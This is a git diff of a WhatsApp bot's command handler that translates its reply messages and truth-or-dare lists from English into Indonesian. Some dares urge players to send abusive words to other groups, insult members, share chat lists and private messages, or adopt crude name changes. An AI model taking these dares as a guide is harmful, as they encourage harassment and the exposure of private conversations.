 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
-replygcNFS(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
+replygcNFS(`Nomor ini ${ya} Telah dihapus dari daftar pemilik oleh pemilik!!!`)
 break
 case 'listpremium': case 'listprem':
 teks = '*Premium List*\n\n'
@@ -3671,11 +3667,11 @@ teks += `\n*Total : ${prem.length}*`
 NFSBotInc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
 break
 case 'setcmd': {
-                if (!m.quoted) return replygcNFS('Reply Message!')
-                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Missing')
-                if (!text) return replygcNFS(`For What Command?`)
+                if (!m.quoted) return replygcNFS('Balas Pesan!')
+                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Tidak ada')
+                if (!text) return replygcNFS(`Untuk Apa Perintah?`)
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('You have no permission to change this sticker command')
+                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('Anda tidak memiliki izin untuk mengubah perintah ini')
                 global.db.sticker[hash] = {
                     text,
                     mentionedJid: m.mentionedJid,
@@ -3688,16 +3684,16 @@ case 'setcmd': {
             break
 case 'delcmd': {
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (!hash) return replygcNFS(`No hashes`)
-                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('You have no permission to delete this sticker command')             
+                if (!hash) return replygcNFS(`Tidak ada hash`)
+                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('Anda tidak memiliki izin untuk menghapus perintah ini')             
                 delete global.db.sticker[hash]
-                replygcNFS(`Done!`)
+                replygcNFS(`Selesai!`)
             }
             break
 case 'listcmd': {
                 let teks = `
 *List Hash*
-Info: *bold* hash is Locked
+Info: *bold* hash Terkunci
 ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
 `.trim()
                 NFSBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
@@ -3705,31 +3701,27 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
             break 
 case 'lockcmd': {
                 if (!isCreator) return NFSStickOwner()
-                if (!m.quoted) return replygcNFS('Reply Message!')
-                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Missing')
+                if (!m.quoted) return replygcNFS('Balas Pesan!')
+                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Tidak ada')
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (!(hash in global.db.sticker)) return replygcNFS('Hash not found in database')
+                if (!(hash in global.db.sticker)) return replygcNFS('Hash tidak ditemukan di database')
                 global.db.sticker[hash].locked = !/^un/i.test(command)
-                replygcNFS('Done!')
+                replygcNFS('Selesai!')
             }
             break
 case 'addmsg': {
-                if (!m.quoted) return replygcNFS('Reply Message You Want To Save In Database')
-                if (!text) return replygcNFS(`Example : ${prefix + command} filename`)
+                if (!m.quoted) return replygcNFS('Balas Pesan yang Ingin Anda Simpan Database')
+                if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama file`)
                 let msgs = global.db.database
-                if (text.toLowerCase() in msgs) return replygcNFS(`'${text}' registered in the message list`)
+                if (text.toLowerCase() in msgs) return replygcNFS(`'${text}' terdaftar dalam daftar pesan`)
                 msgs[text.toLowerCase()] = quoted.fakeObj
-replygcNFS(`Successfully added message in message list as '${text}'
-    
-Access with ${prefix}getmsg ${text}
-
-View list of Messages With ${prefix}listmsg`)
+                replygcNFS(`Berhasil menambahkan pesan dalam daftar pesan sebagai '${text}' Akses dengan ${prefix}getmsg ${text} Lihat daftar Pesan Dengan ${prefix}listmsg`)
             }
             break
 case 'getmsg': {
-                if (!text) return replygcNFS(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
+                if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama file\n\nLihat daftar pesan dengan ${prefix}listmsg`)
                 let msgs = global.db.database
-                if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' not listed in the message list`)
+                if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' tidak tercantum dalam daftar pesan`)
                 NFSBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
@@ -3738,24 +3730,24 @@ case 'listmsg': {
 	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
 		let teks = ' DATABASE LIST \n\n'
 		for (let i of seplit) {
-		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
+		    teks += `${themeemoji} *Nama :* ${i.nama}\n${themeemoji} *Jenis :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
 	        }
 	        replygcNFS(teks)
 	    }
 	    break
 	case 'delmsg': case 'deletemsg': {
 	        let msgs = global.db.database
-	        if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' not listed in the message list`)
+	        if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' tidak tercantum dalam daftar pesan`)
 		delete msgs[text.toLowerCase()]
-		replygcNFS(`Successfully deleted '${text}' from the message list`)
+		replygcNFS(`Berhasil dihapus '${text}' dari daftar pesan`)
             }
 	    break
 case 'setexif': {
                if (!NFSTheCreator) return NFSStickOwner()
-               if (!text) return replygcNFS(`Example : ${prefix + command} packname|author`)
+               if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama paket|pengarang`)
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
-          replygcNFS(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
+          replygcNFS(`Berhasil diubah menjadi\n\n${themeemoji} Nama paket : ${global.packname}\n${themeemoji} Pengarang : ${global.author}`)
             }
             break
 case 'getbio':{
@@ -3766,22 +3758,22 @@ case 'getbio':{
     let bio = await NFSBotInc.fetchStatus(who)
     replygcNFS(bio.status)
   } catch {
-    if (text) return replygcNFS(`bio is private or you haven't replied to the person's message!`)
+    if (text) return replygcNFS(`bio pribadi atau Anda belum membalas pesan orang tersebut!`)
     else try {
       let who = m.quoted ? m.quoted.sender : m.sender
       let bio = await NFSBotInc.fetchStatus(who)
       replygcNFS(bio.status)
     } catch {
-      return replygcNFS(`bio is private or you haven't replied to the person's message!`)
+      return replygcNFS(`bio pribadi atau Anda belum membalas pesan orang tersebut!`)
     }
   }
 }
 break
 case 'setppbot': case 'setbotpp': {
 if (!NFSTheCreator) return NFSStickOwner()
-if (!quoted) return replygcNFS(`Send/Reply Image With Caption ${prefix + command}`)
-if (!/image/.test(mime)) return replygcNFS(`Send/Reply Image With Caption ${prefix + command}`)
-if (/webp/.test(mime)) return replygcNFS(`Send/Reply Image With Caption ${prefix + command}`)
+if (!quoted) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
+if (!/image/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
+if (/webp/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
 var medis = await NFSBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == `full`) {
 var { img } = await generateProfilePicture(medis)
@@ -3801,25 +3793,25 @@ content: img
 ]
 })
 fs.unlinkSync(medis)
-replygcNFS(`Success`)
+replygcNFS(`Berhasil`)
 } else {
 var memeg = await NFSBotInc.updateProfilePicture(botNumber, { url: medis })
 fs.unlinkSync(medis)
-replygcNFS(`Success`)
+replygcNFS(`Berhasil`)
 }
 }
 break
 case 'creategc': case 'creategroup': {
 if (!NFSTheCreator) return NFSStickOwner()
-if (!args.join(" ")) return replygcNFS(`Use ${prefix+command} groupname`)
+if (!args.join(" ")) return replygcNFS(`Gunakan ${prefix+command} Nama Group`)
 try {
 let cret = await NFSBotInc.groupCreate(args.join(" "), [])
 let response = await NFSBotInc.groupInviteCode(cret.id)
-teks = `     「 Create Group 」
+teks = `     「 Membuat Group 」
 
-▸ Name : ${cret.subject}
-▸ Owner : @${cret.owner.split("@")[0]}
-▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}
+▸ Nama : ${cret.subject}
+▸ Pemilik : @${cret.owner.split("@")[0]}
+▸ Pembuat : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}
 
 https://chat.whatsapp.com/${response}
        `
@@ -3860,19 +3852,19 @@ NFSBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, aut
 }
 break
 case 'tomp4': case 'tovideo': {
-                if (!quoted) return replygcNFS('Reply to Sticker')
-                if (!/webp/.test(mime)) return replygcNFS(`reply sticker with caption *${prefix + command}*`)
+                if (!quoted) return replygcNFS('Balas ke Stiker')
+                if (!/webp/.test(mime)) return replygcNFS(`Balas stiker dengan text *${prefix + command}*`)
                 NFSStickWait()
 		        let { webp2mp4File } = require('./lib/uploader')
                 let media = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
                 let webpToMp4 = await webp2mp4File(media)
-                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
+                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversikan Webp Ke Video' } }, { quoted: m })
                 await fs.unlinkSync(media)
             }
             break
             case 'toaud': case 'toaudio': {
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
-            if (!quoted) return replygcNFS(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
+            if (!quoted) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
             NFSStickWait()
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
@@ -3881,9 +3873,9 @@ case 'tomp4': case 'tovideo': {
             }
             break
             case 'tomp3': {
-            if (/document/.test(mime)) return replygcNFS(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!quoted) return replygcNFS(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
+            if (/document/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
+            if (!quoted) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
             NFSStickWait()
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
@@ -3892,8 +3884,8 @@ case 'tomp4': case 'tovideo': {
             }
             break
             case 'tovn': case 'toptt': {
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
-            if (!quoted) return replygcNFS(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
+            if (!quoted) return replygcNFS(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
             NFSStickWait()
             let media = await quoted.download()
             let { toPTT } = require('./lib/converter')
@@ -3902,18 +3894,18 @@ case 'tomp4': case 'tovideo': {
             }
             break
             case 'togif': {
-                if (!quoted) return replygcNFS('Reply video')
-                if (!/webp/.test(mime)) return replygcNFS(`reply sticker with caption *${prefix + command}*`)
+                if (!quoted) return replygcNFS('Balas video')
+                if (!/webp/.test(mime)) return replygcNFS(`Balas stiker dengan Text *${prefix + command}*`)
                 NFSStickWait()
 		let { webp2mp4File } = require('./lib/uploader')
                 let media = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
                 let webpToMp4 = await webp2mp4File(media)
-                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
+                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversikan Webp Ke Video' }, gifPlayback: true }, { quoted: m })
                 await fs.unlinkSync(media)
             }
             break
             case 'toqr':{
-  if (!q) return replygcNFS(' Please include link or text!')
+  if (!q) return replygcNFS('Harap sertakan tautan atau teks!')
    const QrCode = require('qrcode-reader')
    const qrcode = require('qrcode')
    let qyuer = await qrcode.toDataURL(q, { scale: 35 })
@@ -3921,93 +3913,93 @@ case 'tomp4': case 'tovideo': {
    let buff = getRandom('.jpg')
    await fs.writeFileSync('./'+buff, data)
    let medi = fs.readFileSync('./' + buff)
-  await NFSBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
+  await NFSBotInc.sendMessage(from, { image: medi, caption:"Ini dia!"}, { quoted: m })
    setTimeout(() => { fs.unlinkSync(buff) }, 10000)
   }
   break
   case 'dare':
               const dare =[
-    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
-    "spill people who make you pause",
-    "call crush/pickle now and send ss",
-    "drop only emote every time you type on gc/pc for 1 day.",
-    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
-    "call ex saying miss",
-    "sing the chorus of the last song you played",
-    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
-	"Bang on the table (which is at home) until you get scolded for being noisy",
-    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
-    "mention ex's name",
-    "make 1 rhyme for the members!",
-    "send ur whatsapp chat list",
-    "chat random people with gheto language then ss here",
-    "tell your own version of embarrassing things",
-    "tag the person you hate",
-    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
-    "change name to *I AM DONKEY* for 24 hours",
-    "shout *ma chuda ma chuda ma chuda* in front of your house",
-    "snap/post boyfriend photo/crush",
-    "tell me your boyfriend type!",
-    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
-    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
-    "prank chat ex and say *i love u, please come back.* without saying dare!",
-    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
-    "change the name to *I am a child of randi* for 5 hours",
-    "type in bengali 24 hours",
-    "Use selmon bhoi photo for 3 days",
-    "drop a song quote then tag a suitable member for that quote",
-    "send voice note saying can i call u baby?",
-    "ss recent call whatsapp",
-    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
-    "pop to a group member, and say fuck you",
-    "Act like a chicken in front of ur parents",
-    "Pick up a random book and read one page out loud in vn n send it here",
-    "Open your front door and howl like a wolf for 10 seconds",
-    "Take an embarrassing selfie and paste it on your profile picture",
-    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
-    "Walk on your elbows and knees for as long as you can",
-    "sing national anthem in voice note",
-    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
-    "Tell the saddest story you know",
-    "make a twerk dance video and put it on status for 5mins",
-    "Eat a raw piece of garlic",
-    "Show the last five people you texted and what the messages said",
-    "put your full name on status for 5hrs",
-    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
-    "call ur bestie, bitch",
-    "put your photo without filter on ur status for 10mins",
-    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
-    "Send a message to your ex and say I still like you",
-    "call Crush/girlfriend/bestie now and screenshot here",
-    "pop to one of the group member personal chat and Say you ugly bustard",
-    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
-    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
-    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
-    "use any bollywood actor photo as ur pfp for 3 days",
-    "put your crush photo on status with caption, this is my crush",
-    "change name to I AM GAY for 5 hours",
-    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
-    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
-    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
-    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
-    "shout bravooooooooo and send here through voice note",
-    "snap your face then send it here",
-    "Send your photo with a caption, i am lesbian",
-    "shout using harsh words and send it here through vn",
-    "shout you bastard in front of your mom/papa",
-    "change the name to i am idiot for 24 hours",
-    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
-    "say i love the bot owner NFS through voice note",
-    "send your gf/bf pic here",
-    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
-    "breakup with your best friend for 5hrs without telling him/her that its a dare",
-     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
-     "say i love depak kalal through voice note",
-     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
-     "write i am lesbian and put it on status, u can delete only after 5hrs",
-     "kiss your mommy or papa and say i love youðŸ˜Œ",
-     "put your father name on status for 5hrs",
-     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
+    "makan nasi 2 sendok makan tanpa lauk apapun, kalau seret bisa diminum",
+    "menumpahkan orang yang membuat Anda berhenti",
+    "hubungi crush/acar sekarang dan kirim ss",
+    "menjatuhkan hanya emote setiap kali mengetik di gc/pc selama 1 hari.",
+    "Ucapkan selamat datang pada yang ingin menjadi jutawan! ke semua grup yang Anda miliki",
+    "panggil mantan bilang rindu",
+    "nyanyikan bagian refrein dari lagu terakhir yang kamu mainkan",
+    "vn mantan/naksir/pacar kamu, sapa (name), mau telpon, sebentar. aku sangat merindukanmu",
+	"Bang di atas meja (yang ada di rumah) sampai dimarahi karena berisik",
+    "Beri tahu orang secara acak _Saya baru saja diberi tahu bahwa saya adalah saudara kembar Anda terlebih dahulu, kami berpisah, lalu saya menjalani operasi plastik. Dan ini yang paling ciyusss_",
+    "sebutin nama mantan",
+    "buat 1 sajak untuk para member!",
+    "kirim daftar obrolan whatsapp Anda",
+    "mengobrol dengan orang acak dengan bahasa gheto lalu ss di sini",
+    "ceritakan hal memalukan versimu sendiri",
+    "tag orang yang kamu benci",
+    "Berpura-pura kesurupan, misalnya: kesurupan anjing, kesurupan belalang, kesurupan kulkas, dll.",
+    "ganti nama menjadi *AKU KELEDAI* selama 24 jam",
+    "teriak *aku gila aku gila* di depan rumahmu",
+    "jepret / posting foto pacar / naksir",
+    "sebutkan tipe pacarmu!",
+        "katakan *aku naksir kamu, kamu mau jadi pacarku?* ke lawan jenis, terakhir kali kamu chat (submit di wa/tele), tunggu dia balas, kalau punya, mampir ke sini",
+    "rekam suaramu yang berbunyi *titar ke umur do titar, titar ke piche do titar*",
+    "prank chat mantan dan bilang *i love u, please come back.* tanpa bilang dare!",
+    "obrolan ke kontak wa sesuai urutan % baterai anda, lalu beritahu dia *saya beruntung bisa mendapatkan anda!*",
+    "ganti nama jadi *aku anak randi* selama 5 jam",
+    "ketik bahasa bengali 24 jam",
+    "Gunakan foto selmon bhoi selama 3 hari",
+    "jatuhkan kutipan lagu lalu beri tag anggota yang cocok untuk kutipan itu",
+    "Kirim catatan suara mengatakan bisakah aku memanggilmu sayang?",
+    "ss baru-baru ini menelepon whatsapp",
+    "Katakan *KAU SANGAT INDAH JANGAN BERBOHONG* kepada teman-teman!",
+    "muncul ke anggota grup, dan katakan fuck you",
+    "Bertingkah seperti ayam di depan orang tuamu",
+    "Ambil buku acak dan baca satu halaman dengan lantang di vn n kirimkan ke sini",
+    "Buka pintu depanmu dan melolong seperti serigala selama 10 detik",
+    "Ambil selfie yang memalukan dan tempel di foto profil Anda",
+    "Biarkan kelompok memilih kata dan lagu terkenal. Anda harus menyanyikan lagu itu dan mengirimkannya dalam catatan suara",
+    "Berjalan dengan siku dan lutut selama mungkin",
+    "nyanyikan lagu kebangsaan dengan nada suara",
+    "Breakdance selama 30 detik di ruang dudukðŸ˜‚",
+    "Ceritakan kisah paling menyedihkan yang kamu tahu",
+    "buat video tarian twerk dan statuskan selama 5 menit",
+    "Makan sepotong bawang putih mentah",
+    "Tunjukkan lima orang terakhir yang Anda kirimi SMS dan isi pesannya",
+    "cantumkan nama lengkap Anda pada status selama 5 jam",
+    "buat video dansa pendek tanpa filter apa pun hanya dengan musik dan letakkan di status Anda selama 5 jam",
+    "panggil sahabatmu, jalang",
+    "letakkan foto Anda tanpa filter pada status Anda selama 10 menit",
+    "katakan saya suka oli london di catatan suaraðŸ¤£ðŸ¤£",
+    "Kirim pesan ke mantanmu dan katakan aku masih menyukaimu",
+    "hubungi Crush/pacar/sahabat sekarang dan tangkapan layar di sini",
+    "muncul ke salah satu obrolan pribadi anggota grup dan Katakan kamu bustard jelek",
+    "katakan KAMU CANTIK/TAMPAN kepada salah satu orang yang ada di daftar pin atas kamu atau orang pertama di daftar obrolan kamu",
+    "kirim catatan suara dan katakan, bolehkah aku meneleponmu sayang, jika laki-lakimu, tandai perempuan/jika perempuan, tandai laki-laki",
+    "tulis i love you (nama anggota grup acak, yang sedang online) di obrolan pribadi, (jika laki-laki tulis nama perempuan/jika perempuan tulis nama laki-laki) ambil fotonya dan kirim ke sini",
+    "gunakan foto aktor bollywood apa pun sebagai pfp Anda selama 3 hari",
+    "letakkan foto gebetanmu di status dengan keterangan, ini gebetanku",
+    "ganti nama menjadi I AM GAY selama 5 jam",
+    "ngobrol dengan kontak mana pun di whatsapp dan katakan saya akan menjadi bf/gf Anda selama 5 jam",
+    "Kirim catatan suara mengatakan aku naksir kamu, mau jadi pacarku atau tidak? ke sembarang orang dari grup (kalau kamu perempuan pilih laki-laki, kalau laki-laki pilih perempuan",
+    "tampar pantatmu hampir tidak mengirimkan suara tamparan melalui catatan suaraðŸ˜‚",
+    "sebutkan tipe gf/bf kamu dan kirim fotonya ke sini dengan keterangan, cewek/cowok paling jelek di dunia",
+    "berteriak bravooooooooo dan kirim ke sini melalui voice note",
+    "jepret wajahmu lalu kirim ke sini",
+    "Kirim foto Anda dengan keterangan, saya lesbian",
+    "berteriak menggunakan kata-kata kasar dan kirimkan ke sini melalui vn",
+    "teriak kau bajingan di depan ibu/papamu",
+    "ganti nama menjadi saya idiot selama 24 jam",
+    "tampar dirimu dengan tegas dan kirim suara tamparan melalui catatan suaraðŸ˜‚",
+    "katakan saya suka pemilik bot NFS melalui catatan suara",
+    "kirim foto gf/bf kamu ke sini",
+    "Buat video tantangan dance tiktok apa saja dan jadikan status, Anda dapat menghapusnya setelah 5 jam",
+    "putus dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu berani",
+     "Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikah dengannya, tanpa memberitahunya bahwa itu sebuah tantangan",
+     "katakan aku cinta depak kalal lewat voice note",
+     "tulis saya merasa terangsang dan letakkan di status, Anda dapat menghapusnya hanya setelah 5 jam",
+     "tulis saya lesbian dan taruh di status, kamu hanya bisa menghapusnya setelah 5 jam",
+     "cium ibu atau papamu dan katakan aku mencintaimuðŸ˜Œ",
+     "cantumkan nama ayahmu di status selama 5 jam",
+     "kirim kata-kata kasar di grup mana pun, kecuali grup ini, dan kirim bukti tangkapan layar di sini"
 ]
               const NFSdare = dare[Math.floor(Math.random() * dare.length)]
               bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
@@ -4016,109 +4008,109 @@ case 'tomp4': case 'tovideo': {
                             break
        case 'truth':
               const truth =[
-    "Have you ever liked anyone? How long?",
-    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
+    "Apakah kamu pernah menyukai seseorang? Berapa lama?",
+    "Kalau bisa atau kalau mau, gc/gc luar yang mana yang akan kamu jadikan teman? (mungkin beda/tipe sama)",
     "apa ketakutan terbesar kamu?",
-    "Have you ever liked someone and felt that person likes you too?",
-    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
-    "Have you ever stolen money from your father or mom? The reason?",
-    "What makes you happy when you're sad?",
-    "Ever had a one sided love? if so who? how does it feel bro?", 
-    "been someone's mistress?",
-    "the most feared thing",
-    "Who is the most influential person in your life?",
-    "what proud thing did you get this year", 
-    "Who is the person who can make you awesome", 
-    "Who is the person who has ever made you very happy?", 
-    "Who is closest to your ideal type of partner here", 
-    "Who do you like to play with??", 
-    "Have you ever rejected people? the reason why?",
-    "Mention an incident that made you hurt that you still remember", 
-    "What achievements have you got this year??",
-    "What's your worst habit at school??",
-    "What song do you sing most in the shower",
-    "Have you ever had a near-death experience",
-    "When was the last time you were really angry. Why?",
-    "Who is the last person who called you",
-    "Do you have any hidden talents, What are they",
-    "What word do you hate the most?",
-    "What is the last YouTube video you watched?",
-    "What is the last thing you Googled",
-    "Who in this group would you want to swap lives with for a week",
-    "What is the scariest thing thats ever happened to you",
-    "Have you ever farted and blamed it on someone else",
-    "When is the last time you made someone else cry",
-    "Have you ever ghosted a friend",
-    "Have you ever seen a dead body",
-    "Which of your family members annoys you the most and why",
-    "If you had to delete one app from your phone, which one would it be",
-    "What app do you waste the most time on",
-    "Have you ever faked sick to get home from school",
-    "What is the most embarrassing item in your room",
-    "What five items would you bring if you got stuck on a desert island",
-    "Have you ever laughed so hard you peed your pants",
-    "Do you smell your own farts",
-    "have u ever peed on the bed while sleeping ??",
-    "What is the biggest mistake you have ever made",
-    "Have you ever cheated in an exam",
-    "What is the worst thing you have ever done",
-    "When was the last time you cried",
-    "whom do you love the most among ur parents", 
-    "do u sometimes put ur finger in ur nosetril?", 
-    "who was ur crush during the school days",
-    "tell honestly, do u like any boy in this grup",
-    "have you ever liked anyone? how long?",
-    "do you have gf/bf','what is your biggest fear?",
-    "have you ever liked someone and felt that person likes you too?",
-    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
-    "ever did you steal your mothers money or your fathers money",
-    "what makes you happy when you are sad",
-    "do you like someone who is in this grup? if you then who?",
-    "have you ever been cheated on by people?",
-    "who is the most important person in your life",
-    "what proud things did you get this year",
-    "who is the person who can make you happy when u r sad",
-    "who is the person who ever made you feel uncomfortable",
-    "have you ever lied to your parents",
-    "do you still like ur ex",
-    "who do you like to play together with?",
-    "have you ever stolen big thing in ur life? the reason why?",
-    "Mention the incident that makes you hurt that you still remember",
-    "what achievements have you got this year?",
-    "what was your worst habit at school?",
-    "do you love the bot creator, NFS?ðŸ¤£",
-    "have you ever thought of taking revenge from ur teacher?",
-    "do you like current prime minister of ur country",
-    "you non veg or veg",
-    "if you could be invisible, what is the first thing you would do",
-    "what is a secret you kept from your parents",
-    "Who is your secret crush",
-    "whois the last person you creeped on social media",
-    "If a genie granted you three wishes, what would you ask for",
-    "What is your biggest regret",
-    "What animal do you think you most look like",
-    "How many selfies do you take a day",
-    "What was your favorite childhood show",
-    "if you could be a fictional character for a day, who would you choose",
-    "whom do you text the most",
-    "What is the biggest lie you ever told your parents",
-    "Who is your celebrity crush",
-    "Whats the strangest dream you have ever had",
-    "do you play pubg, if you then send ur id number"
+    "Pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
+    "Siapa nama mantan pacar temanmu yang dulu kamu suka diam-diam?",
+    "Apakah kamu pernah mencuri uang dari ayah atau ibumu? Alasannya?",
+    "Apa yang membuatmu bahagia saat sedih?",
+    "Pernah cinta bertepuk sebelah tangan? Kalo pernah sama siapa? gimana rasanya gan?",
+    "pernah menjadi simpanan seseorang?",
+    "hal yang paling ditakuti",
+    "Siapakah orang yang paling berpengaruh dalam hidupmu?",
+    "Hal yang membanggakan apa yang kamu dapatkan tahun ini",
+    "Siapa orang yang bisa membuatmu luar biasa",
+    "Siapakah orang yang pernah membuatmu sangat bahagia?",
+    "Siapa yang paling dekat dengan tipe pasangan idealmu di sini",
+    "Kamu suka main sama siapa??",
+    "Pernahkah kamu menolak orang? Alasannya kenapa?",
+    "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
+    "Prestasi apa yang kamu dapatkan tahun ini??",
+    "Apa kebiasaan terburukmu di sekolah??",
+    "Lagu apa yang paling sering kamu nyanyikan saat mandi",
+    "Apakah Anda pernah memiliki pengalaman mendekati kematian",
+    "Kapan terakhir kali kamu benar-benar marah. Kenapa?",
+    "Siapa orang terakhir yang meneleponmu",
+    "Apakah kamu memiliki bakat tersembunyi, Apa itu",
+    "Kata apa yang paling kamu benci?",
+    "Apa video YouTube terakhir yang kamu tonton?",
+    "Apa hal terakhir yang Anda cari di Google",
+    "Dengan siapa di grup ini kamu ingin bertukar kehidupan selama seminggu",
+    "Apa hal paling menakutkan yang pernah terjadi padamu",
+    "Pernahkah kamu kentut dan menyalahkan orang lain",
+    "Kapan terakhir kali kamu membuat orang lain menangis",
+    "Pernahkah kamu meng-ghost teman",
+    "Pernahkah kamu melihat mayat",
+    "Siapa di antara anggota keluargamu yang paling mengganggumu dan mengapa",
